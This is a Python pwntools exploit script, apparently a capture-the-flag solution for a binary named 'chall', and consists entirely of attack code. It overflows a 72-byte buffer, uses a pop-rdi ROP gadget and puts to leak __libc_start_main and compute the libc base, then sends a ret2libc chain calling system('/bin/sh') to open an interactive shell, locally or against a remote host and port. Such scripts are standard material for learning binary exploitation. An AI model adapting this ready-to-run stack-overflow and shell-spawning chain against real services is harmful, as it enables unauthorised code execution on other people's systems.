#!/usr/bin/env python3
from pwn import *
import sys

elf = context.binary = ELF("./chall", checksec=True)
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
#context.log_level = "debug"

#tmx
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    if args.R:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript, *a, **kw)
    else:
        return process(elf.path, *a, **kw)

gdbscript = """
continue
"""

r = start()
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

# ---------xploit------------

# leak libc
def leak(elf, libc, rop_gadget):

    libc_lsm = elf.symbols["__libc_start_main"]
    main = elf.symbols["main"]
    puts = elf.plt["puts"]

    payload = [
        b"A"*72,
        rop_gadget,
        libc_lsm,
        puts,
        main,
    ]

    rcu(b"data:\n")
    sl(flat(payload))

    l = r.recvline().strip()
    leaked_lsm = u64(l.ljust(8, b"\x00")) 
    logleak("__libc_start_main leak", leaked_lsm)

    return leaked_lsm

ret = 0x401016      # 0x0000000000401016: ret
rop_gadget = 0x40114a  # 0x000000000040114a: pop rdi; ret;
leak = leak(elf, libc, rop_gadget)
libc.address = leak - libc.sym["__libc_start_main"]
libcbase()
# obtain shell
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]


payload = [
    b"A"*72,
    ret,
    rop_gadget,
    bin_sh,
    system
]

rcu(b"data:\n")
sl(flat(payload))
# --------interactive--------
r.interactive()
